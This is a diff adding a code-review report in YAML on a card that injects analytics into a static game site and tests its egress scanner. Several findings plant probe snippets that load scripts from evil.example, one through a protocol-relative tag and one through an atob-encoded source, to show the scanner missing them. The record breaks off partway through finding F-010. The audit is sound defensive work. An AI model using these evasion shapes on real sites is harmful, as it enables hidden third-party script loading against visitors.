@@ -1,0 +1,823 @@
+version: 1
+generated_at: "2026-10-29T13:00:00Z"
+target: "card/285-player-hosting-and-counting @ af160fd5 (cycle 1/3; 3 commits on the cut 464ae377, 6 files, +1583/-25, tree clean)"
+card: CARD-285
+cycle: 1
+mode: initial
+overall_score: 7
+risk_level: medium
+review_lane: deep
+reviewer: forge:review
+reviewer_version: "2026.8.17"
+
+verdict: >-
+  The card does the thing it was for: three acceptance criteria that had no
+  definitions now have real, mutation-resistant tests, and AC-392 -- the board's
+  one true false alive -- is closed. The forced decision (inject the counting
+  snippet at assembly time, default-off) is the right call and I verified the
+  collision that forced it. The residual the round turned into an assertion
+  genuinely constrains: three independent widening mutants died at three
+  different assertion lines. The edited CARD-284 bookkeeping test did not lose
+  its teeth -- it gained some. G-1, G-2, G-5, ADR-0038/R7-R8 and every figure in
+  the round's own record reproduce.
+
+  The score is held below min_score by THREE gating findings, and two of them hit
+  the exact half of the argument the round says carries ADR-0041/R6 -- "the egress
+  set is closed, so there is no channel a visitor identifier could leave by". It
+  is not closed. `scan_site` SILENTLY PASSES a protocol-relative external
+  reference (`<script src="//host/x">`, `url("//host/x")`) and silently passes an
+  attribute assignment from a non-literal (`el.src = atob(...)`), both measured;
+  `classify`'s own `//` branch and `_URL_LITERAL`'s `//host` alternative are
+  unreachable dead code, because the comment stripper eats every `//` before the
+  quoted patterns run. That breaks ADR-0039/R2's own default-deny condition and
+  falsifies the scanner docstring's load-bearing sentence. Third:
+  `test_assembled_site_is_self_contained` drives Chromium against the COUNTED
+  tree with no interception, so the suite fetches the GoatCounter script over the
+  public internet -- I measured three HTTP 200 responses -- which is real
+  third-party egress from the test suite and the one thing the deploy page's own
+  drift step 4 forbids. All three fixes are two lines or less and I verified each
+  one green.
+
+coverage:
+  read:
+    - "meta/kanban/cards/CARD-285.md on main, in full (257 lines) -- the round-1 record and its four corrections to the brief"
+    - "the whole diff 464ae377..af160fd5, all 6 files, with -U10 on tests/test_public_player_pages.py"
+    - "tests/test_public_player_pages.py at HEAD: the module docstring's ref table, the amended bookkeeping test (:1870-:1929), and every line of the Hosting-and-counting section (:1932-:2855)"
+    - "player/assemble.py at HEAD: ANALYTICS_SNIPPET/MARKER/ANCHOR, with_analytics, AssembleReport.counted, assemble()'s injection loop, main()'s both-or-neither"
+    - "scripts/assemble_player_site.py in full (238 lines)"
+    - "docs/deploy/player.md in full (187 lines), including both allow-list blocks and the qr-url-shapes block"
+    - "player/play.html's rewritten comment"
+    - "tests/test_public_player.py's four no-egress controls (:2069, :2318, :2698) and tests/test_public_player_pages.py:570"
+    - "tests/test_puzzle_solver_page.py's browser_type (:545-:557) and browser_page (:670-:677)"
+    - "meta/architecture/decisions/adr/0039-...md's R1/R2/R3 blocks in full; tests/test_suite_profile.py:4149's derived-sets guard"
+    - "meta/architecture/requirements.yml FR-045 AC-390..392 (:5228-:5246); decisions/resolved.yml DEC-046; ADR-0041 (DEC-046 paragraphs)"
+  not_reached:
+    - "the full suite -- the orchestrator's merge gate, deliberately not run. scripts/impact_set.py --base 464ae377 returns FULL (reproduced), so no narrowed reading is derivable from the tool"
+    - "an eyeballed render on a phone -- no image-pipeline change in this diff, so the standing visual-validation rule does not bite"
+    - "the live Vercel/GoatCounter dashboards -- outside the repository, and the deploy page correctly marks every such value TODO(owner)"
+    - "further mutation beyond the 6 I ran -- gating findings this cycle, so Step 8f's ladder puts the rest at deferred(cost)"
+  confidence: high
+
+method_note: >-
+  Every mutant and every planted probe was run in a THROWAWAY detached worktree
+  (git worktree add --detach <scratch> af160fd5), never in the card worktree. The
+  card worktree was `git status --porcelain` empty at af160fd5 before and after
+  this cycle, verified. The scratch worktree's tree hash was asserted back to the
+  baseline 1765c35de8fce85f37e278ab7ea3a4af5536a8a3 after each mutant, and both
+  scratch worktrees were removed at the end (git worktree list confirms).
+
+runs:
+  interpreter: "/Users/omelnikova/PycharmProjects/PythonProject4/.venv/bin/python -m pytest -o addopts='' -p no:randomly, PYTHONDONTWRITEBYTECODE=1"
+  lock_state: "meta/kanban/.full-suite.lock absent for the whole cycle; no run was refused; NONOGRAM_IGNORE_FULL_SUITE_LOCK was never set"
+  load_at_start: "load averages 6.59 13.31 11.00 on 11 cores -- lighter than the brief's 22.25. No run exceeded 20 s; the hang guard never fired."
+  results:
+    - "tests/test_public_player_pages.py tests/test_public_player.py -> 66 passed, 0 skipped (13.51s) -- the round's figure reproduced exactly"
+    - "the same pair with -m browser -rs -> 22 passed, 44 deselected (9.91s), ZERO skip lines -- reproduced"
+    - "tests/test_public_player_pages.py alone (scratch tree at HEAD) -> 33 passed, 0 skipped (7.40s) -- the unmutated-instrument proof every mutant below is measured against"
+    - "tests/test_export_pdf.py::test_the_dependency_baseline_is_still_closed -> 1 passed (0.07s); def confirmed at tests/test_export_pdf.py:1249"
+    - "-m db_required --collect-only -q -> 26/9755 collected, 9729 deselected (7.37s) -- the round's 26 reproduced, by collection, without running the suite"
+    - "--collect-only -q at HEAD -> 9755 tests; at the cut 464ae377 (scratch detached worktree) -> 9748"
+  skips_attributed:
+    - "ZERO skips in every run of this cycle's selection. The two player modules carry no skip, no skipif, no xfail and no pytestmark at all (grep -nE 'pytestmark|skipif|pytest.skip|xfail' over the three changed sources -> no hits)."
+    - "NO Chromium skip is possible, verified at the source rather than taken: tests/test_puzzle_solver_page.py:550 is pytest.fail(..., pytrace=False) on a missing executable and :676 is pytest.fail on a missing pytest_playwright. A missing browser is RED, not an ungated door. The round's claim holds."
+    - "The suite-wide setrlimit skip is at tests/test_book_pdf_memory.py:1297 -- confirmed by reading :1294-:1299; :1296 is the `if verdict != \"bites\":` guard. The card's correction is right and the brief now states it right."
+  conditional_silences:
+    method: "tests/test_suite_profile.py::_conditional_silences run directly over each changed source"
+    results:
+      - "tests/test_public_player_pages.py -> []"
+      - "player/assemble.py -> []"
+      - "scripts/assemble_player_site.py -> []"
+    note: "All three == [], as the round reports. No mark is attached by decorator or by assignment anywhere in the delta."
+
+node_ids:
+  method: "--collect-only -q at af160fd5 and at 464ae377 (the cut, in a scratch detached worktree), grep '^tests/', sort, comm -23 / comm -13"
+  base: 9748
+  head: 9755
+  removed: 0
+  added: 7
+  added_ids:
+    - "tests/test_public_player_pages.py::test_assembled_site_is_self_contained"
+    - "tests/test_public_player_pages.py::test_pages_work_with_analytics_blocked"
+    - "tests/test_public_player_pages.py::test_no_homegrown_tracking"
+    - "tests/test_public_player_pages.py::test_the_qr_url_shapes_here_are_the_shipped_routes"
+    - "tests/test_public_player_pages.py::test_the_assembly_helper_drives_the_assembler_and_writes_nothing_itself"
+    - "tests/test_public_player_pages.py::test_the_deploy_page_is_the_only_place_that_holds_an_endpoint"
+    - "tests/test_public_player_pages.py::test_the_counting_snippet_goes_in_once_and_refuses_anything_else"
+  verdict: "G-5 HOLDS exactly as reported: +7 / -0, comm -23 is empty, so nothing was deleted, renamed, skipped or merged. The one edited test kept its node id."
+
+metrics:
+  diff:
+    files: 6
+    added: 1583
+    removed: 25
+  src_files_in_delta: 0
+  pyproject_in_delta: false
+  meta_files_in_delta: 0
+  per_file:
+    - "docs/deploy/player.md: 187/0 (new)"
+    - "player/assemble.py: 147/0"
+    - "player/play.html: +24/-14 (comment only)"
+    - "scripts/README.md: 26/0"
+    - "scripts/assemble_player_site.py: 238/0 (new)"
+    - "tests/test_public_player_pages.py: 971/15"
+
+guardrails:
+  G-1: "HOLDS. `git diff --name-only 464ae377..HEAD -- src/` -> 0 lines, reproduced. No render.yaml, no Flask route, no admin-service file in the delta."
+  G-2: >-
+    HOLDS, and verified by the def rather than by a grep exit code.
+    tests/test_export_pdf.py::test_the_dependency_baseline_is_still_closed has a real
+    `def` at :1249 and passes. pyproject.toml is not in the diff. The analytics
+    integration is one `<script>` tag in a Python string constant
+    (player/assemble.py's ANALYTICS_SNIPPET) -- no package, no npm artefact.
+    Ref-resolution figures re-measured under the validator's pathspec: 80 tracked
+    files hold the node-id string, 57 are non-Markdown, and exactly 1 is a `.py`
+    file -- tests/test_admin_serving.py:134, where it sits inside a docstring in
+    double backticks. Prose, not the definition. The card's correction of the
+    round's 53 is right; the brief's 57 is right.
+  G-3: >-
+    HOLDS ON THE SHIPPED TREE, with the guard that is supposed to keep it holding
+    compromised -- see F-002 and F-005. The assembled site, counted, scans clean on
+    all three buckets (reproduced). No file in player/ reads an IP, sets a cookie,
+    or carries a per-visitor identifier. What does NOT hold is the round's stated
+    reason it holds.
+  G-4: >-
+    HOLDS. No write API, no score/leaderboard/daily-puzzle surface, no domain or DNS
+    automation anywhere in the diff. CARD-210 was not flipped: it is not in the delta
+    (0 meta/ files changed), and the base URL in docs/deploy/player.md is explicitly
+    `TODO(owner)` and marked NOT observed.
+  G-5: "HOLDS. See node_ids: +7 / -0, zero removals."
+  ADR-0038/R7-R8: >-
+    HOLDS. Both new browser tests carry @pytest.mark.browser and take the existing
+    `browser_page` fixture; `browser_type` is imported from tests/test_public_player
+    (itself re-exported from tests/test_puzzle_solver_page) and is not redefined. No
+    new Playwright dependency; pyproject.toml untouched, so the dev-only extra is
+    where it was. AC-392 is correctly NOT browser-marked -- it is a static scan.
+
+mutation:
+  policy: "Step 8f ladder: gating findings this cycle, so the remaining ladder is deferred(cost). The 6 below were run anyway, because three of the brief's questions could only be answered by driving them."
+  instrument_proof: >-
+    Proved on an UNMUTATED tree first, in the scratch worktree, before any mutant:
+    tests/test_public_player_pages.py -> 33 passed, 0 skipped. Every mutant below was
+    applied by a unique-needle replacement with an `assert count == 1` on the needle
+    (the non-unique trap the round names), and the tree hash was asserted back to
+    1765c35de8fce85f37e278ab7ea3a4af5536a8a3 after each.
+  mutants:
+    - id: M-A
+      subject: "meta/architecture/requirements.yml -- a FOURTH ref for this file that nothing defines (`::test_a_fourth_ref_nothing_defines`)"
+      question: "Did the amended CARD-284 bookkeeping test keep its teeth?"
+      result: "KILLED. test_the_registrys_refs_for_this_file_resolve_or_are_card_285s fails at :1919 -- `assert refs - defined == set()` -> AssertionError: ['test_a_fourth_ref_nothing_defines']."
+    - id: M-B1
+      subject: "player/assemble.py with_analytics -- counting also injects `<link rel=\"preconnect\">`"
+      question: "Does AC-390's counted-vs-uncounted byte assertion constrain against a WIDER snippet?"
+      result: "KILLED at tests/test_public_player_pages.py:2404 (the per-file `counted[name] == uncounted[name].replace(b'</head>', snippet + b'\\n</head>', 1)`)."
+    - id: M-B3
+      subject: "player/assemble.py assemble() -- inject into b/index.html but omit it from report.counted"
+      question: "Does it constrain against a page the report does not name?"
+      result: "KILLED by BOTH test_assembled_site_is_self_contained and test_no_homegrown_tracking (:2589, `referenced == len(report.counted) >= 3` -> 3 == 2)."
+    - id: M-B4
+      subject: "player/assemble.py assemble() -- counting also appends a comment to every published .css"
+      question: "Does it constrain against a NON-html file changed by counting?"
+      result: "KILLED at :2399 (`differs == sorted(direct.counted)`) -- 'Left contains one more item: player.css'."
+    - id: M-C
+      subject: "tests/test_public_player_pages.py classify() -- the dangling-rooted-reference report replaced by `return`"
+      question: "Are AC-390's and AC-392's reached-instrument controls actually reached?"
+      result: "KILLED by both (2 failed, 31 passed). The /no-such-file.css control and the probe-dangling.html control are both real."
+    - id: M-D
+      subject: "player/assemble.py with_analytics -- counting also injects `<link rel=\"stylesheet\" href=\"/missing-page-asset.css\">`, i.e. a failed load of a PAGE asset on the counted tree"
+      question: "Is AC-391's console exemption narrow enough not to absorb the one thing it must not?"
+      result: "KILLED at :2531 -- the 404 on 127.0.0.1/missing-page-asset.css lands in `unexplained`. The round's central AC-391 correction is sound."
+  survivors: "none among the 6"
+  deferred: "the rest of the ladder -- deferred(cost): three gating findings this cycle."
+
+findings:
+  - id: F-001
+    severity: high
+    category: correctness
+    type: defect
+    gating: true
+    file: tests/test_public_player_pages.py
+    line: 2431
+    title: "AC-390's browser journey runs on the COUNTED tree with no interception, so the suite fetches a third-party script over the public internet -- 3 x HTTP 200 measured"
+    description: |
+      `test_assembled_site_is_self_contained`'s step (4c) calls
+      `_serve(direct.site_dir)` -- `direct` is assembled WITH
+      `analytics=(ALLOW_RUNTIME["count"], ALLOW_RUNTIME["script"])` -- and then
+      drives three pages in Chromium. Unlike
+      `test_pages_work_with_analytics_blocked`, it installs NO `page.route`
+      interceptor. The pages carry a live `<script async src=...>` pointing at
+      the GoatCounter script host.
+
+      MEASURED, by a probe test in a scratch worktree at af160fd5 that attaches
+      `page.on("request")`, `page.on("response")` and `page.on("requestfailed")`
+      to the same `counted_host`/`_open_pages`/`_open_play` journey:
+
+        TOTAL REQUESTS: 19
+        NON-SAME-ORIGIN REQUESTS: ['<the GoatCounter script host>/count.js']
+        FOREIGN RESPONSES: [(200, ...), (200, ...), (200, ...)]
+        FOREIGN FAILURES: []
+
+      Three HTTP 200 responses from a third party, once per page door, every run
+      of the suite. No pageview beacon to the count endpoint was observed, most
+      likely because the vendor's script skips a `127.0.0.1` host -- but that is
+      vendor behaviour nothing in this repository asserts or records, so "the
+      owner's numbers are not polluted" is a hope, not a measurement.
+
+      Three separate things are wrong with it:
+      (a) it contradicts docs/deploy/player.md's own Drift-check step 4, "Do not
+          count locally ... so development traffic is not in the owner's numbers".
+          A test run is a local run;
+      (b) it makes a test depend on a third party's availability and on an
+          undocumented localhost policy. Nothing asserts on the script, so an
+          airgapped machine stays green -- the dependency is silent, which is
+          worse than a red;
+      (c) it is the exact shape CARD-283/284's four same-origin controls exist to
+          forbid, re-introduced from the test side.
+    reproduction: >-
+      In a scratch detached worktree at af160fd5, a probe test taking
+      (browser_page, counted_host) with a request/response tap over
+      `_open_pages(page, url, f"/b/{slug}")`, `_open_pages(page, url, "/library")`,
+      `_open_play(page, url, keys["e10"])`, `_tap(page, 0, 0)`; then
+      `page.wait_for_timeout(3000)`. Output above.
+    recommendation: >-
+      Keep the intent -- driving the DEPLOYED pages is right -- and add the two
+      lines AC-391 already has, immediately after `_serve(direct.site_dir)`:
+      `page.route(re.compile("|".join(re.escape(v.split("/")[2]) for v in
+      ALLOW_RUNTIME.values())), lambda route: route.abort())`. VERIFIED: with that
+      added, tests/test_public_player_pages.py -> 33 passed. Worth also asserting
+      that something WAS aborted, so the interceptor cannot go vacuous the way
+      AC-391's `assert blocked` prevents.
+    confidence: high
+    source: measured
+
+  - id: F-002
+    severity: high
+    category: correctness
+    type: gap
+    gating: true
+    file: tests/test_public_player_pages.py
+    line: 2016
+    title: "The comment stripper eats protocol-relative URLs, so `<script src=\"//host/x\">` and `url(\"//host/x\")` are SILENT PASSES -- and classify()'s own `//` branch is dead code"
+    description: |
+      `_COMMENTS`' third form is `re.compile(r"(?<!:)//[^\n]*")`, and
+      `_without_comments` runs over every file BEFORE `_ATTR_TARGET`,
+      `_IMPORT_TARGET`, `_CSS_TARGET` and `_URL_LITERAL` read it. The lookbehind
+      guards only `://`. In `src="//host/x"` the character before `//` is a quote,
+      not a colon, so the whole reference is blanked. `_ABSOLUTE_TARGET` runs on
+      the unstripped text but requires `https?://`, so it does not see it either.
+
+      Consequence, and this is the part that makes it structural rather than a
+      typo: `classify()`'s `if target.startswith(("http://", "https://", "//"))`
+      branch and `_URL_LITERAL`'s `//[A-Za-z0-9.-]+\.[A-Za-z]{2,}` alternative are
+      UNREACHABLE. Both exist precisely to classify a protocol-relative target;
+      neither can ever receive one, because the only patterns that could produce a
+      `//` target read stripped text.
+
+      MEASURED, planted into a copy of the clean counted site in a scratch
+      worktree, then scanned with the real `scan_site` and the real allow-list:
+
+        p1-protocol-relative.html  `<script src="//evil.example/t.js">`
+            -> *** SILENT PASS *** {'foreign': [], 'identifiers': [], 'unclassifiable': []}
+            stripped text: '<!doctype html>...<script src="\n'
+        p7.css  `@font-face { src: url("//evil.example/f.woff2"); }`
+            -> *** SILENT PASS ***
+            stripped text: '@font-face { src: url("\n'
+
+      A protocol-relative external script is the single cheapest way to add a
+      tracker to a static site, and it is the shape the scanner most clearly
+      believes it covers.
+
+      This falsifies three stated claims:
+      (a) `scan_site`'s docstring: "**A shape the scanner cannot classify is a
+          FAILURE, never a silent pass**, which is the one property a
+          denylist-shaped guard cannot have and this one is built around";
+      (b) docs/deploy/player.md's allow-list section: the scan "fails on any
+          external reference that is not here -- and on any reference whose
+          target it cannot classify at all";
+      (c) ADR-0039/R2's own escape clause, which is the clause the round relies
+          on. R2 reads: "Where no such authority exists, the guard defaults to
+          deny: a shape it cannot analyse is a FAILURE, never a silent pass".
+          Default-deny is the CONDITION on the hand-written-set exemption, and it
+          is not met.
+    reproduction: >-
+      Scratch worktree at af160fd5; a probe test taking (counted_site, tmp_path)
+      that `shutil.copytree`s report.site_dir, writes the two files above into the
+      copy, and prints `scan_site(probed, {**ALLOW_RUNTIME, **ALLOW_STATIC})`
+      filtered to the probe's own name. Baseline asserted clean in the same run.
+    recommendation: >-
+      One character class. Change the `//` comment form to
+      `re.compile(r"""(?<![:"'`])//[^\n]*""")` -- do not blank a `//` that is
+      immediately preceded by a quote. VERIFIED in the scratch worktree: p1 and p7
+      both become `{'foreign': ['...: //evil.example/t.js'], ...}`, the real tree
+      stays clean on all three buckets, and tests/test_public_player_pages.py +
+      the probes -> 42 passed. Then add a planted protocol-relative probe to
+      test_no_homegrown_tracking's control set so the fix has a control, and strike
+      the two overclaiming sentences in (a) and (b) or qualify them to the shapes
+      actually covered.
+    confidence: high
+    source: measured
+
+  - id: F-003
+    severity: high
+    category: maintainability
+    type: landmine
+    gating: true
+    file: tests/test_public_player_pages.py
+    line: 2794
+    title: "`test_the_deploy_page_is_the_only_place_that_holds_an_endpoint` reds on ANY tracked file that quotes the endpoint -- meta/review/** included, so this board's own sync breaks it"
+    description: |
+      The test runs `git grep -l --fixed-strings <url>` with no pathspec over the
+      whole tracked tree and asserts `files == [driver.DEPLOY_DOC.as_posix()]`.
+      The intent is sound -- an allow-list with a second copy is not an allow-list
+      -- but the scope is every tracked file, and this board SYNCS review YAMLs
+      into main. So the endpoint string can never again appear in a review report,
+      a card's round record, a CHANGELOG line, a postmortem, or a cross-reference
+      from docs/deploy/render.md, without reddening the suite.
+
+      MEASURED, in a scratch worktree at af160fd5: a single-line
+      meta/review/CARD-285-probe.yml quoting the count endpoint, `git add`ed,
+      then the node run:
+
+        FAILED tests/test_public_player_pages.py::test_the_deploy_page_is_the_only_place_that_holds_an_endpoint
+        tests/test_public_player_pages.py:2800: AssertionError
+        Left contains one more item: 'meta/review/CARD-285-probe.yml'
+
+      This is not hypothetical: cycle 2's report, or any later card's notes, will
+      trip it. I had to deliberately avoid spelling either endpoint in THIS file
+      (see dead_ref_hygiene), which is a constraint a guard should not put on its
+      own reviewers.
+    reproduction: "As above. `git rm --cached` + `rm` restored the tree; `git status --porcelain` clean afterwards."
+    recommendation: >-
+      Scope the search to the files that could be read as configuration. Minimal
+      and verified: append a pathspec to the argv --
+      `["git", "grep", "-l", "--fixed-strings", url, "--", ":!meta"]`. VERIFIED in
+      the scratch worktree: with the probe YAML staged the node passes, and the
+      assertion still reds on a second copy in player/, scripts/, tests/ or docs/,
+      which is the whole of what it means to say. Say in the docstring that meta/
+      is excluded and why (it is a record, not a configuration source).
+    confidence: high
+    source: measured
+
+  - id: F-004
+    severity: medium
+    category: testing
+    type: gap
+    gating: false
+    file: tests/test_public_player_pages.py
+    line: 2600
+    title: "ADR-0039/R3: the comment-stripping exemption has no control for what it must NOT absorb"
+    description: |
+      ADR-0039/R3 is mandatory and in this card's own System contract: "Every
+      exemption a guard grants carries a control for what it must NOT absorb --
+      caught with the exemption removed, missed with it in place."
+
+      `_without_comments` is an exemption -- it is the one place the scan
+      deliberately stops looking. The round states the limit it must not absorb
+      ("`_ABSOLUTE_TARGET` runs on the UNSTRIPPED text, so a full URL in a comment
+      is still reported") and `test_no_homegrown_tracking`'s four planted probes
+      are probe-second-endpoint.html, probe-ip-read.js, probe-unreadable.js and
+      probe-dangling.html. NONE of them is in a comment. The claim has no test.
+
+      The claim is TRUE -- I measured it -- which is why this is medium and not
+      high. Planted into a copy of the clean counted site:
+
+        c1-url-in-comment.js       `// see https://evil.example/t.js for why`      -> CAUGHT (foreign)
+        c3-url-in-block-comment.js `/* https://evil.example/t.js */`               -> CAUGHT (foreign)
+        c4-url-in-html-comment.html `<!-- https://evil.example/t.js -->`           -> CAUGHT (foreign)
+        c2-rooted-in-comment.js    `// see /not-in-this-tree.json for why`         -> SILENT PASS (intended)
+
+      I also confirmed BOTH false positives the round designed around, by
+      monkeypatching `_without_comments` to the identity on the real tree:
+
+        {'unclassifiable': ["player.css: 'not yet decided' is neither absolute nor rooted at the site",
+                            "solver_state.js: '/static/solver_state.js' resolves to no file, directory or rewrite"]}
+
+      and the two sites: `player.css`'s `_IMPORT_TARGET` hit is literally
+      `'from\n   "not yet decided"'`, and solver_state.js line 6 is
+      "// browser test suite with `await import('/static/solver_state.js')`."
+      Both diagnoses are exactly right and both fixes are the right ones.
+    recommendation: >-
+      Add c1/c3/c4 (or just c1) to the planted-probe set, asserting the hit lands
+      in `foreign`. Four lines. That converts the asymmetry from a prose claim into
+      a control, and it is where F-002's protocol-relative probe belongs too.
+    confidence: high
+    source: measured
+
+  - id: F-005
+    severity: medium
+    category: correctness
+    type: gap
+    gating: false
+    file: tests/test_public_player_pages.py
+    line: 2062
+    title: "Reference shapes the scanner does not look for at all are silent passes, not failures -- `el.src = <non-literal>`, `new Worker(...)`, `new Image().src = ...`"
+    description: |
+      The scan's soundness argument is "a target the scanner cannot read is a
+      FAILURE, so the resolution only has to be sound, not complete". That holds
+      for the shapes it looks for: I drove `fetch(obj.url)`, `fetch(param)`,
+      `fetch(\`${base}/x\`)` and all land in `unclassifiable` correctly, and
+      `URL_CALLS`'s one-hop `_assignments` is genuinely sound (literals-only, with
+      the total-count check that makes it so).
+
+      The hole is one level up: `URL_CALLS` and `_ATTR_TARGET` are the only two
+      routes to a request target, and `_ATTR_TARGET` requires a QUOTE immediately
+      after `=`. An attribute assigned from an expression therefore produces no
+      shape at all -- the scanner never notices a reference is being made, so
+      there is nothing to call unclassifiable.
+
+      MEASURED, planted into a copy of the clean counted site:
+
+        p2-src-from-nonliteral.js
+            `const s = document.createElement("script");`
+            `s.src = atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvdC5qcw==");`
+            `document.head.appendChild(s);`
+            -> *** SILENT PASS *** on all three buckets
+        p3-worker.js
+            `const w = new Worker(window.name);`
+            `const i = new Image(); i.src = window.name;`
+            -> *** SILENT PASS ***
+        p4-slashes-in-string.js
+            `const sep = "a//b"; const u = "/not-in-this-tree.json"; fetch(u);`
+            -> *** SILENT PASS *** (the declared comment-strip cost, measured: the
+               bare `//` truncates the line and takes the fetch with it)
+
+      Two shapes DO get caught, and the reasons are worth recording because they
+      are luck rather than design: `window.location.assign("https://...")` is
+      caught by `_ABSOLUTE_TARGET` on the raw text (only because the URL is a
+      literal), and `new XMLHttpRequest()` is caught by IDENTIFIER_SHAPES' own
+      trip-wire, not by any reference pass.
+
+      Same R2 default-deny breach as F-002, by a different route. Separated
+      because the fix is different and larger.
+    recommendation: >-
+      Make the absence of a readable target a shape in its own right: report
+      `(?:src|href)\s*=\s*` not followed by a quote as `unclassifiable`, and add
+      `Worker`, `Image`, `location.assign` and `window.open` to `URL_CALLS` (they
+      already get the sound one-hop treatment for free). If a false positive turns
+      up on the real tree, that is a named exemption under ADR-0039/R3 with its own
+      control -- which is the shape the card already uses well elsewhere.
+    confidence: high
+    source: measured
+
+  - id: F-006
+    severity: medium
+    category: correctness
+    type: gap
+    gating: false
+    file: tests/test_public_player_pages.py
+    line: 2573
+    title: "The two allow-list blocks are a flat union, so \"non-runtime, nothing fetches it\" is documentary only -- a live `<script src>` to the non-runtime entry is permitted"
+    description: |
+      `scan_site` takes one `allow` dict, and every caller passes
+      `{**ALLOW_RUNTIME, **ALLOW_STATIC}`. The distinction the deploy page draws
+      -- "Runtime: the visitor's browser fetches these" vs. "Non-runtime: named
+      here so the scanner can classify them ... Nothing fetches these at page
+      load" -- has no mechanism behind it. Declaring a URL non-runtime grants it
+      full runtime permission.
+
+      MEASURED, planted into a copy of the clean counted site:
+
+        c5-nonruntime-tracker.html
+            `<script src="https://openapi.vercel.sh/vercel.json"></script>`
+            -> *** SILENT PASS ***
+
+      A live script tag to the non-runtime entry, in an HTML page, scans clean.
+      The entry is harmless today; the shape is not, because the next non-runtime
+      entry somebody adds (a schema, a docs link, a badge) silently becomes a
+      permitted runtime egress channel.
+
+      This is also the honest answer to "is the doc still a single allow-list in
+      any meaningful sense": in the only sense the scan uses, yes -- it is one
+      union. The two-block split is a comment.
+    recommendation: >-
+      Hold the split to its own claim: pass the two dicts separately and permit an
+      `ALLOW_STATIC` member only in a file nothing fetches at page load -- today,
+      only `vercel.json` -- so a non-runtime URL in any `.html`, `.js` or `.css`
+      is `foreign`. With that, the declaration "nothing fetches these" becomes a
+      measured property, and Control 1's shape (drop a member, watch it red)
+      extends to the non-runtime block, which today has no control at all.
+    confidence: high
+    source: measured
+
+  - id: F-007
+    severity: low
+    category: testing
+    type: inaccuracy
+    gating: false
+    file: tests/test_public_player_pages.py
+    line: 2527
+    title: "AC-391 exempts by text OR located URL, not by located URL as the round reports; and `assert len(hosts) >= 1` should be an equality"
+    description: |
+      The round's record and the brief both say "the handler records
+      `(text, location.url)` and exempts by the located URL". The code is
+      `if not any(host in entry[0] or host in entry[1] for host in hosts)` -- an
+      OR over text and URL, so a console error whose TEXT happened to contain an
+      analytics host would also be absorbed.
+
+      The property the round wanted still holds, and I proved it rather than
+      reasoning about it: M-D plants a failed load of a PAGE asset on the counted
+      tree and the test reds at :2531 with
+      `('Failed to load resource: the server responded with a status of 404 (File
+      not found)', 'http://127.0.0.1:.../missing-page-asset.css')` in
+      `unexplained`. So this is a reporting inaccuracy plus a latent widening, not
+      a live defect.
+
+      Separately, `assert len(hosts) >= 1, hosts` is weaker than the derivation
+      supports: `allow_list` guarantees both `count` and `script`, so two hosts
+      are expected and a collapse to one (both endpoints on the same host) would
+      pass unnoticed while halving what the interceptor blocks.
+    recommendation: "Drop `host in entry[0] or` and exempt by `entry[1]` alone (M-D stays killed either way). Make the floor `assert sorted(hosts) == <the two derived from ALLOW_RUNTIME>` or at least `len(hosts) == 2`. Correct the sentence in the card's round record."
+    confidence: high
+    source: measured
+
+  - id: F-008
+    severity: low
+    category: documentation
+    type: gap
+    gating: false
+    file: docs/deploy/player.md
+    line: 160
+    title: "The bound is not stated where a reader meets the claim -- and the deploy page states the opposite"
+    description: |
+      The brief asks whether the declared/derived bound is "stated where a reader
+      meets the claim". It is not. The honest statement of the split -- "This set
+      is DECLARED, not derived, and that is this guard's one honest gap against
+      ADR-0039/R2 ... a lexical set here can only ever be a trip-wire" -- lives in
+      a comment above `IDENTIFIER_SHAPES` in a test module. Excellent writing, and
+      nobody deploying the site will read it.
+
+      Where a reader DOES meet the claim, docs/deploy/player.md's Usage-counting
+      section, there is no bound at all: "Nothing we ship reads, stores or
+      transmits a visitor's IP or any per-visitor identifier (ADR-0041/R6, G-3)",
+      flat; and the allow-list section claims the scan "fails ... on any reference
+      whose target it cannot classify at all", which F-002, F-005 and F-006
+      measure to be false in four shapes.
+
+      The page's own preamble sets a discipline it then does not follow for this:
+      "A value is filled in only where there is evidence for it in the repository,
+      and the evidence is dated." The reach of the scan is such a value.
+
+      (Not a finding: the vendor privacy claims -- cookieless, no stored IP -- are
+      sourced, DEC-046/ADR-0041 is cited at the section head and resolved.yml:236
+      carries the decision. Those are fine.)
+    recommendation: >-
+      Two sentences in the Usage-counting section: what the scan derives (the
+      references from the tree, the permitted set from this page, the routes from
+      vercel.json) and what it declares (the identifier vocabulary, a trip-wire
+      over a non-enumerable set), plus the shapes it does not read, once F-002/F-005
+      are fixed. Then the sentence quoted above becomes true as written.
+    confidence: high
+    source: measured
+
+  - id: F-009
+    severity: low
+    category: documentation
+    type: undeclared_constraint
+    gating: false
+    file: player/assemble.py
+    line: 441
+    title: "`with_analytics`'s https-only, no-quote and single-`</head>` refusals are undeclared constraints"
+    description: |
+      `with_analytics` raises ValueError on a non-`https://` endpoint, on an
+      endpoint containing a quote / `<` / whitespace, on a document that already
+      carries the marker, and on a document with any count of `</head>` other than
+      one. `allow_list` independently refuses a non-https entry in either block.
+
+      Every one of these is RIGHT for a public site -- the quote check is an
+      attribute-injection guard and the https check is not optional for a page
+      served over TLS. None is stated in the card, in FR-045's ACs, or in
+      docs/deploy/player.md. An owner who registers a self-hosted counter on
+      `http://` will meet a ValueError from a line nothing told them about.
+
+      `test_the_counting_snippet_goes_in_once_and_refuses_anything_else` holds all
+      four refusals properly (I ran it; the different-endpoint case is the good
+      one, and it is exactly what an attribute marker buys over a URL marker).
+      This is a note about where the constraint is written down, not about whether
+      it is tested.
+    recommendation: "One line in the deploy page's allow-list section: both endpoints must be absolute https URLs with no quote or whitespace, and the helper refuses anything else. No registry change needed."
+    confidence: high
+    source: measured
+
+  - id: F-010
+    severity: info
+    category: testing
+    type: residual
+    gating: false
+    file: tests/test_public_player_pages.py
+    line: 2454
+    title: "\"The deployed tree is never the tested tree\" is FALSE as stated -- the counted tree is browser-tested twice; the real residual is narrower"
+    description: |
+      I disagree with the brief's framing, on a measurement. The counted tree IS
+      loaded in Chromium by both new browser tests: AC-391 via `counted_host`, and
+      AC-390 step (4c) via `_serve(direct.site_dir)` (which is F-001's defect, but
+      it does mean the deployed pages are driven). The three doors and a mark are
+      exercised on the counted tree in both.
+
+      What is NOT observed on the counted tree is a full request-SET closure --
+      neither test attaches `page.on("request")` and asserts every request is
+      same-origin or allow-listed. CARD-283/284's four controls do that only on the
+      uncounted tree (verified: tests/test_public_player.py:2069/:2318/:2698 and
+      tests/test_public_player_pages.py:570 all take `pages_host`/`site`).
+
